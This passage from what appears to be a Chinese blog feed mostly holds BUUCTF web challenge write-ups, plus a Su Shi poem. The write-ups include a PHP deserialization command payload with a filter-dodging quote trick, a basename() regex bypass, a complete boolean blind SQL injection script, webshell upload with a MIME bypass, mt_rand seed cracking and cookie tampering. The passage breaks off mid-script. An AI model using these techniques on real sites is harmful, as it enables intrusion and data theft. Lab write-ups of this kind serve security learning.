invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>回显<code>alright</code>后直接访问<code>viper</code>就行：</p><p><img src="/img/tee1.png" alt="tee1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//通过echo，这时$b这个类的实例被当成字符串了</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:35:&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tee2.png" alt="tee2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定风波·南海归赠王定国侍人寓娘</title>
    <link href="/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/"/>
    <url>/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/</url>
    
    <content type="html"><![CDATA[<p>​      </p><span id="more"></span><hr><h2 id="定风波·南海归赠王定国侍人寓娘"><a href="#定风波·南海归赠王定国侍人寓娘" class="headerlink" title="定风波·南海归赠王定国侍人寓娘"></a>定风波·南海归赠王定国侍人寓娘</h2><p>[宋] 苏轼</p><p>常羡人间琢玉郎。天应乞与点酥娘。尽道清歌传皓齿。风起。雪飞炎海变清凉。<br>万里归来颜愈少。微笑。笑时犹带岭梅香。试问岭南应不好。却道。此心安处是吾乡</p>]]></content>
    
    
    
    <tags>
      
      <tag>阅读</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_4</title>
    <link href="/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/"/>
    <url>/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//超全局变量，它包含了当前正在执行的脚本文件的文件名。</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basename用来获取文件名部分</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">64</span>));<span class="hljs-comment">//生成一个64字节（即512位）的随机密钥，并将其转换为十六进制表示的字符串。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<span class="hljs-comment">//哈希值相等</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码其实很好理解。一开始以为<code>hash_equals</code>存在绕过。。后来才知道考的是<code>basename</code>绕过：</p><p>先了解一下<code>$_SERVER[&#39;PHP_SELF&#39;]</code>这东西干啥用的<code>(参考https://www.shawroot.cc/937.html和https://www.cnblogs.com/Article-kelp/p/16045800.html)</code></p><p>$_SERVER[‘PHP_SELF’]：相对于网站根目录的路径及 PHP 程序名称。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">网址：https:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><br><span class="hljs-variable">$_SERVER</span>[‘PHP_SELF’] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[‘SCRIPT_NAME’] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<br><span class="hljs-variable">$_SERVER</span>[‘REQUEST_URI’] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br>basename()函数就是获取路径中的文件名部分<br></code></pre></td></tr></table></figure><p>利用点就是这个<code>basename</code>，根据这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basename用来获取文件名部分</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以知道如果令<code>basename($_SERVER[&#39;PHP_SELF&#39;])是config.php</code>就能拿到<code>flag</code>。我们可以构造<code>URL:http://7a610bd9-e609-454a-a18c-d1e340cfde4a.node4.buuoj.cn:81/index.php/config.php?source=1(注意这个index.php，最开始我没加)</code>:</p><p><img src="/img/canyouguess1.png" alt="canyouguess1"></p><p>再看上面那段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//超全局变量，它包含了当前正在执行的脚本文件的文件名。</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>先去掉正则匹配中的转义符号会好理解一些：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config.php/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//超全局变量，它包含了当前正在执行的脚本文件的文件名。</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><code>/config.php/*$/i</code>这部分的意思就是不区分大小写匹配<code>config.php/</code>结尾的字符串<code>(其中/匹配零次或多次)</code></p><p>。这样以来就限制了我们利用<code>highlight_file</code>函数去拿flag。但我们可以利用某些字符串绕过正则：<strong>basename()会去掉不可见字符</strong>，<code>Fuzz</code>一下不可见字符，然后随便取一个就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-string">&#x27;config.php&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//注意这个%2F其实是/，不能用！</span><br></code></pre></td></tr></table></figure><p><img src="/img/canuguess1.png" alt="canuguess1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php/config.php/%ff?source=1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;2c11cab3-0cfc-4f3d-ac4e-87969e74320e&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>index.php/config.php/%ff?source=1</code>经过<code>$_SERVER[&#39;PHP_SELF&#39;]</code>变成<code>index.php/config.php/%ff</code>()这里不会触发正则)，然后<code>basename</code>去掉不可见字符得到<code>config.php</code></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>随便输个<code>student number</code>，注意<code>URL</code>:</p><p><img src="/img/yanzhi1.png" alt="yanzhi1"></p><p>初步判断<code>SQL</code>注入，通过<code>1&#39;--+/1&#39;%23/1 --+ /1%23</code>判断是数字型注入</p><p><code>?stunum=1 and 1--+</code></p><p><img src="/img/yanzhi5.png" alt="yanzhi5"></p><p><code>?stunum=1/**/and/**/0 --+</code>:(过滤空格，0换成1有回显)</p><p><img src="/img/yanzhi4.png" alt="yanzhi4"></p><p>尝试了堆叠注入没结果。。试了试<code>if(length(database())&gt;1,1,0)</code></p><p><img src="/img/yanzhi2.png" alt="yanzhi2"></p><p><code>?stunum=if(length(database())&gt;99,1,0)</code></p><p><img src="/img/yanzhi3.png" alt="yanzhi3"></p><p>布尔盲注，可以通过页面回显判断<code>if</code>语句正确与否：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        paylaod = &#123;<span class="hljs-string">&quot;stunum&quot;</span>:<span class="hljs-string">&quot;if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)&#125;<br>        <span class="hljs-comment">#爆库：if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#爆表：if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#爆字段：if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#爆数据：if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url=url,params=paylaod)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.3</span>)<br><br></code></pre></td></tr></table></figure><p>简单说一下二分法原理，首先是设置<code>low=31</code>和<code>high=127</code>:<code>ASCII</code>码中可见字符的范围是<code>32-126</code>。</p><p>自己写个字典放进去遍历也行。</p><p> <code>min = mid +1</code> 和 <code>max = mid</code>:</p><p>当判断 <code>mid </code>大于某个值的结果为<code> true</code> 时, 这个所求值肯定是比<code>mid</code>要大的 (大于), 所以是 <code>mid + 1</code></p><p>当结果为<code> false</code> 时, 所求值应该是不超过<code>mid </code>(小于等于), 所以是 <code>max = mid</code></p><p>经过多次循环后让<code>high</code>比<code>low</code>小，这时的<code>high</code>就是我们需要的数据。</p><p>可以自己在草稿纸上过一下过程。</p><p>这题手注也可以：参考<code>https://blog.csdn.net/weixin_61355725/article/details/126518079</code></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><img src="/img/cvmaker1.png" alt="cvmaker1"></p><p>先随便注册一个用户，登录：</p><p><img src="/img/cvmaker2.png" alt="cvmaker2"></p><p>发现有上传文件的功能，猜测文件上传漏洞：</p><p><img src="/img/cvmaker3.png" alt="cvmaker3"></p><p>我点更换头像然后随便上传了个一句话。。卡住了刷新页面就出了这么个东西</p><p>妈的这题我环境有问题。。明明登录了他一直给我弹<code>Please Login </code>啥的。。烦死了，而且有时点按钮啥反应不给</p><p><code>exif_imagetype</code>这东西就是个<code>MIME</code>过滤，上传一句话后抓包改一下<code>content-type</code>就行</p><p>上传后会返回一个路径，访问然后蚁剑连接</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p><img src="/img/chou1.png" alt="chou1"></p><p>右键看源码也没啥提示，试着输入一些字符串然后抓包：</p><p><img src="/img/chou2.png" alt="chou2"></p><p>明文传输，不过可以看到右边好像返回了部分<code>PHP</code>代码？</p><p>我回到原页面并没有啥新东西，<code>F12</code>打开网络，重新发数据后发现有这么个东西：</p><p><img src="/img/chou3.png" alt="chou3"></p><p>访问<code>check.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">JXRHwWFvH5<br><br>没抽中哦，再试试吧<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<span class="hljs-comment">//种子</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<span class="hljs-comment">//原始字符串，起始位置和长度 </span><br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<span class="hljs-comment">//给了前十位</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>); <br></code></pre></td></tr></table></figure><p>强等于绕过肯定不要想了，搜了一下<code>mt_rand</code>绕过：<code>https://www.freebuf.com/vuls/192012.html</code></p><p>重点就是<code>mt_rand</code>这东西由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p><p>给了序列和前十位，我们先将前十位还原成为生成的随机数，然后拼接形成<code>php_mt_seed</code>需要的参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;B8F2IQkNd6&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br><span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//strpos会返回字符串第一次出现的位置，从0开始</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <span class="hljs-comment">//长度62，从0到61</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//37 37 0 61 34 34 0 61 41 41 0 61 28 28 0 61 44 44 0 61 52 52 0 61 10 10 0 61 49 49 0 61 3 3 0 61 32 32 0 61 </span><br>    <br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">547943121</span>);    <span class="hljs-comment">//在这里填入获得的种子</span><br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-comment">//B8F2IQkNd6gc0fOa7AvT</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/choujiang3.png" alt="choujiang3"></p><p>利用种子生成随机数再生成密码后注意和前十位对一下(PHP版本不同生成的结果不同)</p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>商店类型题目：</p><p><img src="/img/cookiestore1.png" alt="cookiestore1"></p><p>最开始有<code>50</code>，购买<code>FLAG</code>需要<code>100</code>，购买时抓包看下过程：</p><p><img src="/img/cookieeeestore2.png" alt="cookieeeestore2"></p><p>注意这段<code>cookie</code>，数字大小写字母混合等号结尾，看着像<code>base64</code>，解码：</p><p><img src="/img/cookiestore3.png" alt="cookiestore3"></p><p>以<code>JSON</code>格式存有钱和历史购买记录，直接修改<code>money</code>为<code>10000</code>:</p><p><img src="/img/cookiestore4.png" alt="cookiestore4"></p><p>购买<code>flag</code>然后把<code>cookie</code>换了就行，买完<code>flag</code>是多少会自己显示。</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目提示<code>python,pickle</code>，应该是<code>pickle</code>的反序列化漏洞</p><p><img src="/img/kun1.png" alt="kun1"></p><p><img src="/img/kun2.png" alt="kun2"></p><p>目测是要通过数据包修改买个<code>lv6</code>的账号，不过这个账号有很多页要一页一页翻(也可以写个脚本试试)？先注册看看怎么个事：</p><p><img src="/img/kun3.png" alt="kun3"></p><p>可以看到刚进去我们是有<code>1000</code>的启动资金，页面<code>URL:http://7e29da18-470a-4d1c-99c1-70e88eff89f1.node4.buuoj.cn:81/shop?page=2</code> ，写个脚本找<code>lv6</code>的界面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span 